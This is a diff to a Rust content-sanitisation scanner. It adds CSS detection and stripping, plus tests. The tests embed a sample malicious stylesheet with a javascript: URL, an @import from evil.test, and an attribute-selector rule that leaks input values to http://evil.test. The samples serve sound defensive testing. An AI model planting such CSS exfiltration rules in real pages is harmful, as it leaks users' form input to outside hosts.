@@ -1,3 +1,4 @@
+mod css;
 mod pdf;
 mod svg;
 mod tiff;
@@ -7,6 +8,7 @@ use crate::report::{Location, MAX_FRAGMENT_BYTES, SanitisationAction, truncate_f
 use crate::scan::dos::xml::xml_has_active_content;
 use crate::scan::dos::zip::zip_has_active_content;
 use crate::sniff::{MimeType, SniffOutcome};
+use css::{css_has_active_content, sanitize_css};
 use pdf::{pdf_has_active_content, sanitize_pdf};
 use svg::{sanitize_svg, svg_has_active_content};
 use tiff::{rewrite_tiff, tiff_has_structural_risk};
@@ -39,6 +41,7 @@ pub fn scan_active_content(input: SniffOutcome, rules: &SubresourcesRules) -> Sc
             .map(|o| vec![single_action("scan.xml.xxe", o, &data)])
             .unwrap_or_default(),
         Some(MimeType::ImageSvg) => svg_has_active_content(&data),
+        Some(MimeType::TextCss) => css_has_active_content(&data),
         _ => Vec::new(),
     };
 
@@ -86,17 +89,28 @@ fn rewrite_if_possible(mime_type: Option<MimeType>, data: Vec<u8>) -> Vec<u8> {
         Some(MimeType::ApplicationPdf) => sanitize_pdf(&data).unwrap_or(data),
         Some(MimeType::ImageTiff) => rewrite_tiff(data),
         Some(MimeType::ImageSvg) => sanitize_svg(&data),
+        Some(MimeType::TextCss) => sanitize_css(&data),
         _ => data,
     }
 }
 
 fn single_action(rule_id: &str, offset: usize, data: &[u8]) -> SanitisationAction {
+    located_action(rule_id, 0, offset, data)
+}
+
+/// Same, for a scanner that knows which line the construct sits on.
+pub(super) fn located_action(
+    rule_id: &str,
+    line: u64,
+    offset: usize,
+    data: &[u8],
+) -> SanitisationAction {
     let fragment_end = (offset + MAX_FRAGMENT_BYTES).min(data.len());
     SanitisationAction {
         rule_id: rule_id.to_string(),
         category: "active_content".to_string(),
         location: Location {
-            line: 0,
+            line,
             byte_offset: offset as u64,
         },
         original: truncate_fragment(
@@ -311,6 +325,38 @@ mod tests {
         let result = scan_active_content(outcome, &reject_rules());
         assert!(result.refused);
         assert_eq!(result.actions[0].original, "");
+    }
+
+    const MALICIOUS_CSS: &[u8] = br#"body { background: url("javascript:alert(1)") }
+@import "http://evil.test/x.css";
+input[value^='a'] { background: url('http://evil.test/?v=a') }
+p { color: red }"#;
+
+    #[test]
+    fn a_malicious_stylesheet_is_refused() {
+        let outcome = declared_outcome(MimeType::TextCss, MALICIOUS_CSS.to_vec());
+        let result = scan_active_content(outcome, &reject_rules());
+
+        assert!(result.refused);
+        assert_eq!(result.output, None);
+        let ids: Vec<&str> = result.actions.iter().map(|a| a.rule_id.as_str()).collect();
+        assert!(ids.contains(&"scan.css.dangerous_scheme"));
+        assert!(ids.contains(&"scan.css.import"));
+        assert!(ids.contains(&"scan.css.exfiltration"));
+        assert!(result.actions.iter().all(|a| a.action == Action::Refuse));
+    }
+
+    #[test]
+    fn a_malicious_stylesheet_is_stripped_under_allow() {
+        let outcome = declared_outcome(MimeType::TextCss, MALICIOUS_CSS.to_vec());
+        let result = scan_active_content(outcome, &allow_rules());
+
+        assert!(!result.refused);
+        let out = String::from_utf8(result.output.unwrap()).unwrap();
+        assert!(!out.contains("javascript:"));
+        assert!(!out.contains("@import"));
+        assert!(!out.contains("evil.test"));
+        assert!(out.contains("p { color: red }"));
     }
 
     #[test]
